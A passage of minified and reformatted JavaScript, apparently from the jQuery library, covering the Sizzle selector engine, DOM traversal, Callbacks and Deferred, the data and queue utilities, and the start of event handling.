              return M(e, t) > -1;
            },
            a,
            !0
          ),
          h = [
            function (t, i, n) {
              var s =
                (!r && (n || i !== c)) ||
                ((e = i).nodeType ? u(t, i, n) : d(t, i, n));
              return (e = null), s;
            },
          ];
        o > l;
        l++
      )
        if ((i = n.relative[t[l].type])) h = [mt(vt(h), i)];
        else {
          if ((i = n.filter[t[l].type].apply(null, t[l].matches))[w]) {
            for (s = ++l; o > s && !n.relative[t[s].type]; s++);
            return _t(
              l > 1 && vt(h),
              l > 1 &&
                gt(
                  t
                    .slice(0, l - 1)
                    .concat({ value: " " === t[l - 2].type ? "*" : "" })
                ).replace(R, "$1"),
              i,
              s > l && wt(t.slice(l, s)),
              o > s && wt((t = t.slice(s))),
              o > s && gt(t)
            );
          }
          h.push(i);
        }
      return vt(h);
    }
    function bt(t, e) {
      var i = e.length > 0,
        s = t.length > 0,
        o = function (o, r, a, l, u) {
          var d,
            f,
            m,
            v = 0,
            y = "0",
            _ = o && [],
            w = [],
            b = c,
            x = o || (s && n.find.TAG("*", u)),
            T = (C += null == b ? 1 : Math.random() || 0.1),
            k = x.length;
          for (
            u && (c = r === p || r || u);
            y !== k && null != (d = x[y]);
            y++
          ) {
            if (s && d) {
              for (
                f = 0, r || d.ownerDocument === p || (h(d), (a = !g));
                (m = t[f++]);

              )
                if (m(d, r || p, a)) {
                  l.push(d);
                  break;
                }
              u && (C = T);
            }
            i && ((d = !m && d) && v--, o && _.push(d));
          }
          if (((v += y), i && y !== v)) {
            for (f = 0; (m = e[f++]); ) m(_, w, r, a);
            if (o) {
              if (v > 0) for (; y--; ) _[y] || w[y] || (w[y] = $.call(l));
              w = yt(w);
            }
            N.apply(l, w),
              u && !o && w.length > 0 && v + e.length > 1 && st.uniqueSort(l);
          }
          return u && ((C = T), (c = b)), _;
        };
      return i ? rt(o) : o;
    }
    return (
      (ft.prototype = n.filters = n.pseudos),
      (n.setFilters = new ft()),
      (r = st.tokenize =
        function (t, e) {
          var i,
            s,
            o,
            r,
            a,
            l,
            c,
            u = k[t + " "];
          if (u) return e ? 0 : u.slice(0);
          for (a = t, l = [], c = n.preFilter; a; ) {
            for (r in ((i && !(s = q.exec(a))) ||
              (s && (a = a.slice(s[0].length) || a), l.push((o = []))),
            (i = !1),
            (s = B.exec(a)) &&
              ((i = s.shift()),
              o.push({ value: i, type: s[0].replace(R, " ") }),
              (a = a.slice(i.length))),
            n.filter))
              !(s = Y[r].exec(a)) ||
                (c[r] && !(s = c[r](s))) ||
                ((i = s.shift()),
                o.push({ value: i, type: r, matches: s }),
                (a = a.slice(i.length)));
            if (!i) break;
          }
          return e ? a.length : a ? st.error(t) : k(t, l).slice(0);
        }),
      (a = st.compile =
        function (t, e) {
          var i,
            n = [],
            s = [],
            o = S[t + " "];
          if (!o) {
            for (e || (e = r(t)), i = e.length; i--; )
              (o = wt(e[i]))[w] ? n.push(o) : s.push(o);
            (o = S(t, bt(s, n))).selector = t;
          }
          return o;
        }),
      (l = st.select =
        function (t, e, s, o) {
          var l,
            c,
            u,
            d,
            h,
            p = "function" == typeof t && t,
            f = !o && r((t = p.selector || t));
          if (((s = s || []), 1 === f.length)) {
            if (
              (c = f[0] = f[0].slice(0)).length > 2 &&
              "ID" === (u = c[0]).type &&
              i.getById &&
              9 === e.nodeType &&
              g &&
              n.relative[c[1].type]
            ) {
              if (!(e = (n.find.ID(u.matches[0].replace(et, it), e) || [])[0]))
                return s;
              p && (e = e.parentNode), (t = t.slice(c.shift().value.length));
            }
            for (
              l = Y.needsContext.test(t) ? 0 : c.length;
              l-- && ((u = c[l]), !n.relative[(d = u.type)]);

            )
              if (
                (h = n.find[d]) &&
                (o = h(
                  u.matches[0].replace(et, it),
                  (J.test(c[0].type) && pt(e.parentNode)) || e
                ))
              ) {
                if ((c.splice(l, 1), !(t = o.length && gt(c))))
                  return N.apply(s, o), s;
                break;
              }
          }
          return (
            (p || a(t, f))(
              o,
              e,
              !g,
              s,
              !e || (J.test(t) && pt(e.parentNode)) || e
            ),
            s
          );
        }),
      (i.sortStable = w.split("").sort(E).join("") === w),
      (i.detectDuplicates = !!d),
      h(),
      (i.sortDetached = at(function (t) {
        return 1 & t.compareDocumentPosition(p.createElement("div"));
      })),
      at(function (t) {
        return (
          (t.innerHTML = "<a href='#'></a>"),
          "#" === t.firstChild.getAttribute("href")
        );
      }) ||
        lt("type|href|height|width", function (t, e, i) {
          return i
            ? void 0
            : t.getAttribute(e, "type" === e.toLowerCase() ? 1 : 2);
        }),
      (i.attributes &&
        at(function (t) {
          return (
            (t.innerHTML = "<input/>"),
            t.firstChild.setAttribute("value", ""),
            "" === t.firstChild.getAttribute("value")
          );
        })) ||
        lt("value", function (t, e, i) {
          return i || "input" !== t.nodeName.toLowerCase()
            ? void 0
            : t.defaultValue;
        }),
      at(function (t) {
        return null == t.getAttribute("disabled");
      }) ||
        lt(j, function (t, e, i) {
          var n;
          return i
            ? void 0
            : !0 === t[e]
            ? e.toLowerCase()
            : (n = t.getAttributeNode(e)) && n.specified
            ? n.value
            : null;
        }),
      st
    );
  })(t);
  (p.find = _),
    (p.expr = _.selectors),
    (p.expr[":"] = p.expr.pseudos),
    (p.uniqueSort = p.unique = _.uniqueSort),
    (p.text = _.getText),
    (p.isXMLDoc = _.isXML),
    (p.contains = _.contains);
  var w = function (t, e, i) {
      for (var n = [], s = void 0 !== i; (t = t[e]) && 9 !== t.nodeType; )
        if (1 === t.nodeType) {
          if (s && p(t).is(i)) break;
          n.push(t);
        }
      return n;
    },
    b = function (t, e) {
      for (var i = []; t; t = t.nextSibling)
        1 === t.nodeType && t !== e && i.push(t);
      return i;
    },
    C = p.expr.match.needsContext,
    x = /^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,
    T = /^.[^:#\[\.,]*$/;
  function k(t, e, i) {
    if (p.isFunction(e))
      return p.grep(t, function (t, n) {
        return !!e.call(t, n, t) !== i;
      });
    if (e.nodeType)
      return p.grep(t, function (t) {
        return (t === e) !== i;
      });
    if ("string" == typeof e) {
      if (T.test(e)) return p.filter(e, t, i);
      e = p.filter(e, t);
    }
    return p.grep(t, function (t) {
      return a.call(e, t) > -1 !== i;
    });
  }
  (p.filter = function (t, e, i) {
    var n = e[0];
    return (
      i && (t = ":not(" + t + ")"),
      1 === e.length && 1 === n.nodeType
        ? p.find.matchesSelector(n, t)
          ? [n]
          : []
        : p.find.matches(
            t,
            p.grep(e, function (t) {
              return 1 === t.nodeType;
            })
          )
    );
  }),
    p.fn.extend({
      find: function (t) {
        var e,
          i = this.length,
          n = [],
          s = this;
        if ("string" != typeof t)
          return this.pushStack(
            p(t).filter(function () {
              for (e = 0; i > e; e++) if (p.contains(s[e], this)) return !0;
            })
          );
        for (e = 0; i > e; e++) p.find(t, s[e], n);
        return (
          ((n = this.pushStack(i > 1 ? p.unique(n) : n)).selector = this
            .selector
            ? this.selector + " " + t
            : t),
          n
        );
      },
      filter: function (t) {
        return this.pushStack(k(this, t || [], !1));
      },
      not: function (t) {
        return this.pushStack(k(this, t || [], !0));
      },
      is: function (t) {
        return !!k(this, "string" == typeof t && C.test(t) ? p(t) : t || [], !1)
          .length;
      },
    });
  var S,
    E = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
  ((p.fn.init = function (t, e, i) {
    var s, o;
    if (!t) return this;
    if (((i = i || S), "string" == typeof t)) {
      if (
        !(s =
          "<" === t[0] && ">" === t[t.length - 1] && t.length >= 3
            ? [null, t, null]
            : E.exec(t)) ||
        (!s[1] && e)
      )
        return !e || e.jquery ? (e || i).find(t) : this.constructor(e).find(t);
      if (s[1]) {
        if (
          ((e = e instanceof p ? e[0] : e),
          p.merge(
            this,
            p.parseHTML(s[1], e && e.nodeType ? e.ownerDocument || e : n, !0)
          ),
          x.test(s[1]) && p.isPlainObject(e))
        )
          for (s in e)
            p.isFunction(this[s]) ? this[s](e[s]) : this.attr(s, e[s]);
        return this;
      }
      return (
        (o = n.getElementById(s[2])) &&
          o.parentNode &&
          ((this.length = 1), (this[0] = o)),
        (this.context = n),
        (this.selector = t),
        this
      );
    }
    return t.nodeType
      ? ((this.context = this[0] = t), (this.length = 1), this)
      : p.isFunction(t)
      ? void 0 !== i.ready
        ? i.ready(t)
        : t(p)
      : (void 0 !== t.selector &&
          ((this.selector = t.selector), (this.context = t.context)),
        p.makeArray(t, this));
  }).prototype = p.fn),
    (S = p(n));
  var A = /^(?:parents|prev(?:Until|All))/,
    D = { children: !0, contents: !0, next: !0, prev: !0 };
  function I(t, e) {
    for (; (t = t[e]) && 1 !== t.nodeType; );
    return t;
  }
  p.fn.extend({
    has: function (t) {
      var e = p(t, this),
        i = e.length;
      return this.filter(function () {
        for (var t = 0; i > t; t++) if (p.contains(this, e[t])) return !0;
      });
    },
    closest: function (t, e) {
      for (
        var i,
          n = 0,
          s = this.length,
          o = [],
          r = C.test(t) || "string" != typeof t ? p(t, e || this.context) : 0;
        s > n;
        n++
      )
        for (i = this[n]; i && i !== e; i = i.parentNode)
          if (
            i.nodeType < 11 &&
            (r
              ? r.index(i) > -1
              : 1 === i.nodeType && p.find.matchesSelector(i, t))
          ) {
            o.push(i);
            break;
          }
      return this.pushStack(o.length > 1 ? p.uniqueSort(o) : o);
    },
    index: function (t) {
      return t
        ? "string" == typeof t
          ? a.call(p(t), this[0])
          : a.call(this, t.jquery ? t[0] : t)
        : this[0] && this[0].parentNode
        ? this.first().prevAll().length
        : -1;
    },
    add: function (t, e) {
      return this.pushStack(p.uniqueSort(p.merge(this.get(), p(t, e))));
    },
    addBack: function (t) {
      return this.add(null == t ? this.prevObject : this.prevObject.filter(t));
    },
  }),
    p.each(
      {
        parent: function (t) {
          var e = t.parentNode;
          return e && 11 !== e.nodeType ? e : null;
        },
        parents: function (t) {
          return w(t, "parentNode");
        },
        parentsUntil: function (t, e, i) {
          return w(t, "parentNode", i);
        },
        next: function (t) {
          return I(t, "nextSibling");
        },
        prev: function (t) {
          return I(t, "previousSibling");
        },
        nextAll: function (t) {
          return w(t, "nextSibling");
        },
        prevAll: function (t) {
          return w(t, "previousSibling");
        },
        nextUntil: function (t, e, i) {
          return w(t, "nextSibling", i);
        },
        prevUntil: function (t, e, i) {
          return w(t, "previousSibling", i);
        },
        siblings: function (t) {
          return b((t.parentNode || {}).firstChild, t);
        },
        children: function (t) {
          return b(t.firstChild);
        },
        contents: function (t) {
          return t.contentDocument || p.merge([], t.childNodes);
        },
      },
      function (t, e) {
        p.fn[t] = function (i, n) {
          var s = p.map(this, e, i);
          return (
            "Until" !== t.slice(-5) && (n = i),
            n && "string" == typeof n && (s = p.filter(n, s)),
            this.length > 1 &&
              (D[t] || p.uniqueSort(s), A.test(t) && s.reverse()),
            this.pushStack(s)
          );
        };
      }
    );
  var $,
    O = /\S+/g;
  function N() {
    n.removeEventListener("DOMContentLoaded", N),
      t.removeEventListener("load", N),
      p.ready();
  }
  (p.Callbacks = function (t) {
    t =
      "string" == typeof t
        ? (function (t) {
            var e = {};
            return (
              p.each(t.match(O) || [], function (t, i) {
                e[i] = !0;
              }),
              e
            );
          })(t)
        : p.extend({}, t);
    var e,
      i,
      n,
      s,
      o = [],
      r = [],
      a = -1,
      l = function () {
        for (s = t.once, n = e = !0; r.length; a = -1)
          for (i = r.shift(); ++a < o.length; )
            !1 === o[a].apply(i[0], i[1]) &&
              t.stopOnFalse &&
              ((a = o.length), (i = !1));
        t.memory || (i = !1), (e = !1), s && (o = i ? [] : "");
      },
      c = {
        add: function () {
          return (
            o &&
              (i && !e && ((a = o.length - 1), r.push(i)),
              (function e(i) {
                p.each(i, function (i, n) {
                  p.isFunction(n)
                    ? (t.unique && c.has(n)) || o.push(n)
                    : n && n.length && "string" !== p.type(n) && e(n);
                });
              })(arguments),
              i && !e && l()),
            this
          );
        },
        remove: function () {
          return (
            p.each(arguments, function (t, e) {
              for (var i; (i = p.inArray(e, o, i)) > -1; )
                o.splice(i, 1), a >= i && a--;
            }),
            this
          );
        },
        has: function (t) {
          return t ? p.inArray(t, o) > -1 : o.length > 0;
        },
        empty: function () {
          return o && (o = []), this;
        },
        disable: function () {
          return (s = r = []), (o = i = ""), this;
        },
        disabled: function () {
          return !o;
        },
        lock: function () {
          return (s = r = []), i || (o = i = ""), this;
        },
        locked: function () {
          return !!s;
        },
        fireWith: function (t, i) {
          return (
            s ||
              ((i = [t, (i = i || []).slice ? i.slice() : i]),
              r.push(i),
              e || l()),
            this
          );
        },
        fire: function () {
          return c.fireWith(this, arguments), this;
        },
        fired: function () {
          return !!n;
        },
      };
    return c;
  }),
    p.extend({
      Deferred: function (t) {
        var e = [
            ["resolve", "done", p.Callbacks("once memory"), "resolved"],
            ["reject", "fail", p.Callbacks("once memory"), "rejected"],
            ["notify", "progress", p.Callbacks("memory")],
          ],
          i = "pending",
          n = {
            state: function () {
              return i;
            },
            always: function () {
              return s.done(arguments).fail(arguments), this;
            },
            then: function () {
              var t = arguments;
              return p
                .Deferred(function (i) {
                  p.each(e, function (e, o) {
                    var r = p.isFunction(t[e]) && t[e];
                    s[o[1]](function () {
                      var t = r && r.apply(this, arguments);
                      t && p.isFunction(t.promise)
                        ? t
                            .promise()
                            .progress(i.notify)
                            .done(i.resolve)
                            .fail(i.reject)
                        : i[o[0] + "With"](
                            this === n ? i.promise() : this,
                            r ? [t] : arguments
                          );
                    });
                  }),
                    (t = null);
                })
                .promise();
            },
            promise: function (t) {
              return null != t ? p.extend(t, n) : n;
            },
          },
          s = {};
        return (
          (n.pipe = n.then),
          p.each(e, function (t, o) {
            var r = o[2],
              a = o[3];
            (n[o[1]] = r.add),
              a &&
                r.add(
                  function () {
                    i = a;
                  },
                  e[1 ^ t][2].disable,
                  e[2][2].lock
                ),
              (s[o[0]] = function () {
                return s[o[0] + "With"](this === s ? n : this, arguments), this;
              }),
              (s[o[0] + "With"] = r.fireWith);
          }),
          n.promise(s),
          t && t.call(s, s),
          s
        );
      },
      when: function (t) {
        var e,
          i,
          n,
          o = 0,
          r = s.call(arguments),
          a = r.length,
          l = 1 !== a || (t && p.isFunction(t.promise)) ? a : 0,
          c = 1 === l ? t : p.Deferred(),
          u = function (t, i, n) {
            return function (o) {
              (i[t] = this),
                (n[t] = arguments.length > 1 ? s.call(arguments) : o),
                n === e ? c.notifyWith(i, n) : --l || c.resolveWith(i, n);
            };
          };
        if (a > 1)
          for (e = new Array(a), i = new Array(a), n = new Array(a); a > o; o++)
            r[o] && p.isFunction(r[o].promise)
              ? r[o]
                  .promise()
                  .progress(u(o, i, e))
                  .done(u(o, n, r))
                  .fail(c.reject)
              : --l;
        return l || c.resolveWith(n, r), c.promise();
      },
    }),
    (p.fn.ready = function (t) {
      return p.ready.promise().done(t), this;
    }),
    p.extend({
      isReady: !1,
      readyWait: 1,
      holdReady: function (t) {
        t ? p.readyWait++ : p.ready(!0);
      },
      ready: function (t) {
        (!0 === t ? --p.readyWait : p.isReady) ||
          ((p.isReady = !0),
          (!0 !== t && --p.readyWait > 0) ||
            ($.resolveWith(n, [p]),
            p.fn.triggerHandler &&
              (p(n).triggerHandler("ready"), p(n).off("ready"))));
      },
    }),
    (p.ready.promise = function (e) {
      return (
        $ ||
          (($ = p.Deferred()),
          "complete" === n.readyState ||
          ("loading" !== n.readyState && !n.documentElement.doScroll)
            ? t.setTimeout(p.ready)
            : (n.addEventListener("DOMContentLoaded", N),
              t.addEventListener("load", N))),
        $.promise(e)
      );
    }),
    p.ready.promise();
  var P = function (t, e, i, n, s, o, r) {
      var a = 0,
        l = t.length,
        c = null == i;
      if ("object" === p.type(i))
        for (a in ((s = !0), i)) P(t, e, a, i[a], !0, o, r);
      else if (
        void 0 !== n &&
        ((s = !0),
        p.isFunction(n) || (r = !0),
        c &&
          (r
            ? (e.call(t, n), (e = null))
            : ((c = e),
              (e = function (t, e, i) {
                return c.call(p(t), i);
              }))),
        e)
      )
        for (; l > a; a++) e(t[a], i, r ? n : n.call(t[a], a, e(t[a], i)));
      return s ? t : c ? e.call(t) : l ? e(t[0], i) : o;
    },
    M = function (t) {
      return 1 === t.nodeType || 9 === t.nodeType || !+t.nodeType;
    };
  function j() {
    this.expando = p.expando + j.uid++;
  }
  (j.uid = 1),
    (j.prototype = {
      register: function (t, e) {
        var i = e || {};
        return (
          t.nodeType
            ? (t[this.expando] = i)
            : Object.defineProperty(t, this.expando, {
                value: i,
                writable: !0,
                configurable: !0,
              }),
          t[this.expando]
        );
      },
      cache: function (t) {
        if (!M(t)) return {};
        var e = t[this.expando];
        return (
          e ||
            ((e = {}),
            M(t) &&
              (t.nodeType
                ? (t[this.expando] = e)
                : Object.defineProperty(t, this.expando, {
                    value: e,
                    configurable: !0,
                  }))),
          e
        );
      },
      set: function (t, e, i) {
        var n,
          s = this.cache(t);
        if ("string" == typeof e) s[e] = i;
        else for (n in e) s[n] = e[n];
        return s;
      },
      get: function (t, e) {
        return void 0 === e
          ? this.cache(t)
          : t[this.expando] && t[this.expando][e];
      },
      access: function (t, e, i) {
        var n;
        return void 0 === e || (e && "string" == typeof e && void 0 === i)
          ? void 0 !== (n = this.get(t, e))
            ? n
            : this.get(t, p.camelCase(e))
          : (this.set(t, e, i), void 0 !== i ? i : e);
      },
      remove: function (t, e) {
        var i,
          n,
          s,
          o = t[this.expando];
        if (void 0 !== o) {
          if (void 0 === e) this.register(t);
          else {
            p.isArray(e)
              ? (n = e.concat(e.map(p.camelCase)))
              : ((s = p.camelCase(e)),
                e in o
                  ? (n = [e, s])
                  : (n = (n = s) in o ? [n] : n.match(O) || [])),
              (i = n.length);
            for (; i--; ) delete o[n[i]];
          }
          (void 0 === e || p.isEmptyObject(o)) &&
            (t.nodeType ? (t[this.expando] = void 0) : delete t[this.expando]);
        }
      },
      hasData: function (t) {
        var e = t[this.expando];
        return void 0 !== e && !p.isEmptyObject(e);
      },
    });
  var H = new j(),
    L = new j(),
    z = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
    W = /[A-Z]/g;
  function F(t, e, i) {
    var n;
    if (void 0 === i && 1 === t.nodeType)
      if (
        ((n = "data-" + e.replace(W, "-$&").toLowerCase()),
        "string" == typeof (i = t.getAttribute(n)))
      ) {
        try {
          i =
            "true" === i ||
            ("false" !== i &&
              ("null" === i
                ? null
                : +i + "" === i
                ? +i
                : z.test(i)
                ? p.parseJSON(i)
                : i));
        } catch (t) {}
        L.set(t, e, i);
      } else i = void 0;
    return i;
  }
  p.extend({
    hasData: function (t) {
      return L.hasData(t) || H.hasData(t);
    },
    data: function (t, e, i) {
      return L.access(t, e, i);
    },
    removeData: function (t, e) {
      L.remove(t, e);
    },
    _data: function (t, e, i) {
      return H.access(t, e, i);
    },
    _removeData: function (t, e) {
      H.remove(t, e);
    },
  }),
    p.fn.extend({
      data: function (t, e) {
        var i,
          n,
          s,
          o = this[0],
          r = o && o.attributes;
        if (void 0 === t) {
          if (
            this.length &&
            ((s = L.get(o)), 1 === o.nodeType && !H.get(o, "hasDataAttrs"))
          ) {
            for (i = r.length; i--; )
              r[i] &&
                0 === (n = r[i].name).indexOf("data-") &&
                ((n = p.camelCase(n.slice(5))), F(o, n, s[n]));
            H.set(o, "hasDataAttrs", !0);
          }
          return s;
        }
        return "object" == typeof t
          ? this.each(function () {
              L.set(this, t);
            })
          : P(
              this,
              function (e) {
                var i, n;
                if (o && void 0 === e) {
                  if (
                    void 0 !==
                    (i =
                      L.get(o, t) ||
                      L.get(o, t.replace(W, "-$&").toLowerCase()))
                  )
                    return i;
                  if (((n = p.camelCase(t)), void 0 !== (i = L.get(o, n))))
                    return i;
                  if (void 0 !== (i = F(o, n, void 0))) return i;
                } else
                  (n = p.camelCase(t)),
                    this.each(function () {
                      var i = L.get(this, n);
                      L.set(this, n, e),
                        t.indexOf("-") > -1 &&
                          void 0 !== i &&
                          L.set(this, t, e);
                    });
              },
              null,
              e,
              arguments.length > 1,
              null,
              !0
            );
      },
      removeData: function (t) {
        return this.each(function () {
          L.remove(this, t);
        });
      },
    }),
    p.extend({
      queue: function (t, e, i) {
        var n;
        return t
          ? ((e = (e || "fx") + "queue"),
            (n = H.get(t, e)),
            i &&
              (!n || p.isArray(i)
                ? (n = H.access(t, e, p.makeArray(i)))
                : n.push(i)),
            n || [])
          : void 0;
      },
      dequeue: function (t, e) {
        e = e || "fx";
        var i = p.queue(t, e),
          n = i.length,
          s = i.shift(),
          o = p._queueHooks(t, e);
        "inprogress" === s && ((s = i.shift()), n--),
          s &&
            ("fx" === e && i.unshift("inprogress"),
            delete o.stop,
            s.call(
              t,
              function () {
                p.dequeue(t, e);
              },
              o
            )),
          !n && o && o.empty.fire();
      },
      _queueHooks: function (t, e) {
        var i = e + "queueHooks";
        return (
          H.get(t, i) ||
          H.access(t, i, {
            empty: p.Callbacks("once memory").add(function () {
              H.remove(t, [e + "queue", i]);
            }),
          })
        );
      },
    }),
    p.fn.extend({
      queue: function (t, e) {
        var i = 2;
        return (
          "string" != typeof t && ((e = t), (t = "fx"), i--),
          arguments.length < i
            ? p.queue(this[0], t)
            : void 0 === e
            ? this
            : this.each(function () {
                var i = p.queue(this, t, e);
                p._queueHooks(this, t),
                  "fx" === t && "inprogress" !== i[0] && p.dequeue(this, t);
              })
        );
      },
      dequeue: function (t) {
        return this.each(function () {
          p.dequeue(this, t);
        });
      },
      clearQueue: function (t) {
        return this.queue(t || "fx", []);
      },
      promise: function (t, e) {
        var i,
          n = 1,
          s = p.Deferred(),
          o = this,
          r = this.length,
          a = function () {
            --n || s.resolveWith(o, [o]);
          };
        for (
          "string" != typeof t && ((e = t), (t = void 0)), t = t || "fx";
          r--;

        )
          (i = H.get(o[r], t + "queueHooks")) &&
            i.empty &&
            (n++, i.empty.add(a));
        return a(), s.promise(e);
      },
    });
  var R = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
    q = new RegExp("^(?:([+-])=|)(" + R + ")([a-z%]*)$", "i"),
    B = ["Top", "Right", "Bottom", "Left"],
    U = function (t, e) {
      return (
        (t = e || t),
        "none" === p.css(t, "display") || !p.contains(t.ownerDocument, t)
      );
    };
  function V(t, e, i, n) {
    var s,
      o = 1,
      r = 20,
      a = n
        ? function () {
            return n.cur();
          }
        : function () {
            return p.css(t, e, "");
          },
      l = a(),
      c = (i && i[3]) || (p.cssNumber[e] ? "" : "px"),
      u = (p.cssNumber[e] || ("px" !== c && +l)) && q.exec(p.css(t, e));
    if (u && u[3] !== c) {
      (c = c || u[3]), (i = i || []), (u = +l || 1);
      do {
        (u /= o = o || ".5"), p.style(t, e, u + c);
      } while (o !== (o = a() / l) && 1 !== o && --r);
    }
    return (
      i &&
        ((u = +u || +l || 0),
        (s = i[1] ? u + (i[1] + 1) * i[2] : +i[2]),
        n && ((n.unit = c), (n.start = u), (n.end = s))),
      s
    );
  }
  var Q = /^(?:checkbox|radio)$/i,
    Y = /<([\w:-]+)/,
    K = /^$|\/(?:java|ecma)script/i,
    X = {
      option: [1, "<select multiple='multiple'>", "</select>"],
      thead: [1, "<table>", "</table>"],
      col: [2, "<table><colgroup>", "</colgroup></table>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
      _default: [0, "", ""],
    };
  function Z(t, e) {
    var i =
      void 0 !== t.getElementsByTagName
        ? t.getElementsByTagName(e || "*")
        : void 0 !== t.querySelectorAll
        ? t.querySelectorAll(e || "*")
        : [];
    return void 0 === e || (e && p.nodeName(t, e)) ? p.merge([t], i) : i;
  }
  function G(t, e) {
    for (var i = 0, n = t.length; n > i; i++)
      H.set(t[i], "globalEval", !e || H.get(e[i], "globalEval"));
  }
  (X.optgroup = X.option),
    (X.tbody = X.tfoot = X.colgroup = X.caption = X.thead),
    (X.th = X.td);
  var J = /<|&#?\w+;/;
  function tt(t, e, i, n, s) {
    for (
      var o,
        r,
        a,
        l,
        c,
        u,
        d = e.createDocumentFragment(),
        h = [],
        f = 0,
        g = t.length;
      g > f;
      f++
    )
      if ((o = t[f]) || 0 === o)
        if ("object" === p.type(o)) p.merge(h, o.nodeType ? [o] : o);
        else if (J.test(o)) {
          for (
            r = r || d.appendChild(e.createElement("div")),
              a = (Y.exec(o) || ["", ""])[1].toLowerCase(),
              l = X[a] || X._default,
              r.innerHTML = l[1] + p.htmlPrefilter(o) + l[2],
              u = l[0];
            u--;

          )
            r = r.lastChild;
          p.merge(h, r.childNodes), ((r = d.firstChild).textContent = "");
        } else h.push(e.createTextNode(o));
    for (d.textContent = "", f = 0; (o = h[f++]); )
      if (n && p.inArray(o, n) > -1) s && s.push(o);
      else if (
        ((c = p.contains(o.ownerDocument, o)),
        (r = Z(d.appendChild(o), "script")),
        c && G(r),
        i)
      )
        for (u = 0; (o = r[u++]); ) K.test(o.type || "") && i.push(o);
    return d;
  }
  !(function () {
    var t = n.createDocumentFragment().appendChild(n.createElement("div")),
      e = n.createElement("input");
    e.setAttribute("type", "radio"),
      e.setAttribute("checked", "checked"),
      e.setAttribute("name", "t"),
      t.appendChild(e),
      (d.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked),
      (t.innerHTML = "<textarea>x</textarea>"),
      (d.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue);
  })();
  var et = /^key/,
    it = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
    nt = /^([^.]*)(?:\.(.+)|)/;
  function st() {
    return !0;
  }
  function ot() {
    return !1;
  }
  function rt() {
    try {
      return n.activeElement;
    } catch (t) {}
  }
  function at(t, e, i, n, s, o) {
    var r, a;
    if ("object" == typeof e) {
      for (a in ("string" != typeof i && ((n = n || i), (i = void 0)), e))
        at(t, a, i, n, e[a], o);
      return t;
    }
    if (
      (null == n && null == s
        ? ((s = i), (n = i = void 0))
        : null == s &&
          ("string" == typeof i
            ? ((s = n), (n = void 0))
            : ((s = n), (n = i), (i = void 0))),
      !1 === s)
    )
      s = ot;
    else if (!s) return t;
    return (
      1 === o &&
        ((r = s),
        ((s = function (t) {
          return p().off(t), r.apply(this, arguments);
        }).guid = r.guid || (r.guid = p.guid++))),
      t.each(function () {
        p.event.add(this, e, s, n, i);
      })
    );
  }
  (p.event = {
    global: {},
    add: function (t, e, i, n, s) {
      var o,
        r,
        a,
        l,
        c,
        u,
        d,
        h,
        f,
        g,
        m,
        v = H.get(t);
      if (v)
        for (
          i.handler && ((i = (o = i).handler), (s = o.selector)),
            i.guid || (i.guid = p.guid++),
            (l = v.events) || (l = v.events = {}),
            (r = v.handle) ||
              (r = v.handle =
                function (e) {
                  return void 0 !== p && p.event.triggered !== e.type
                    ? p.event.dispatch.apply(t, arguments)
                    : void 0;
                }),
            c = (e = (e || "").match(O) || [""]).length;
          c--;

        )
          (f = m = (a = nt.exec(e[c]) || [])[1]),
            (g = (a[2] || "").split(".").sort()),
            f &&
              ((d = p.event.special[f] || {}),
              (f = (s ? d.delegateType : d.bindType) || f),
              (d = p.event.special[f] || {}),
              (u = p.extend(
                {
                  type: f,
                  origType: m,
                  data: n,
                  handler: i,
                  guid: i.guid,
                  selector: s,
                  needsContext: s && p.expr.match.needsContext.test(s),
                  namespace: g.join("."),
                },
                o
              )),
              (h = l[f]) ||
                (((h = l[f] = []).delegateCount = 0),
                (d.setup && !1 !== d.setup.call(t, n, g, r)) ||
                  (t.addEventListener && t.addEventListener(f, r))),
              d.add &&
                (d.add.call(t, u), u.handler.guid || (u.handler.guid = i.guid)),
              s ? h.splice(h.delegateCount++, 0, u) : h.push(u),
              (p.event.global[f] = !0));
    },
    remove: function (t, e, i, n, s) {
      var o,
        r,
        a,
        l,
        c,
        u,
        d,
        h,
        f,
        g,
        m,
        v = H.hasData(t) && H.get(t);
      if (v && (l = v.events)) {
        for (c = (e = (e || "").match(O) || [""]).length; c--; )
          if (
            ((f = m = (a = nt.exec(e[c]) || [])[1]),
            (g = (a[2] || "").split(".").sort()),
            f)
          ) {
            for (
              d = p.event.special[f] || {},
                h = l[(f = (n ? d.delegateType : d.bindType) || f)] || [],
                a =
                  a[2] &&
                  new RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)"),
                r = o = h.length;
              o--;

            )
              (u = h[o]),
                (!s && m !== u.origType) ||
                  (i && i.guid !== u.guid) ||
                  (a && !a.test(u.namespace)) ||
                  (n && n !== u.selector && ("**" !== n || !u.selector)) ||
                  (h.splice(o, 1),
                  u.selector && h.delegateCount--,
                  d.remove && d.remove.call(t, u));
            r &&
              !h.length &&
              ((d.teardown && !1 !== d.teardown.call(t, g, v.handle)) ||
                p.removeEvent(t, f, v.handle),
              delete l[f]);
          } else for (f in l) p.event.remove(t, f + e[c], i, n, !0);
        p.isEmptyObject(l) && H.remove(t, "handle events");
      }
    },
    dispatch: function (t) {
      t = p.event.fix(t);
      var e,
        i,
        n,
        o,
        r,
        a = [],
        l = s.call(arguments),
        c = (H.get(this, "events") || {})[t.type] || [],
        u = p.event.special[t.type] || {};
      if (
        ((l[0] = t),
        (t.delegateTarget = this),
        !u.preDispatch || !1 !== u.preDispatch.call(this, t))
      ) {
        for (
          a = p.event.handlers.call(this, t, c), e = 0;
          (o = a[e++]) && !t.isPropagationStopped();

        )
          for (
            t.currentTarget = o.elem, i = 0;
            (r = o.handlers[i++]) && !t.isImmediatePropagationStopped();

          )
            (t.rnamespace && !t.rnamespace.test(r.namespace)) ||
              ((t.handleObj = r),
              (t.data = r.data),
              void 0 !==
                (n = (
                  (p.event.special[r.origType] || {}).handle || r.handler
                ).apply(o.elem, l)) &&
                !1 === (t.result = n) &&
                (t.preventDefault(), t.stopPropagation()));
        return u.postDispatch && u.postDispatch.call(this, t), t.result;
      }
    },
    handlers: function (t, e) {
      var i,
        n,
        s,
        o,
        r = [],
        a = e.delegateCount,
        l = t.target;
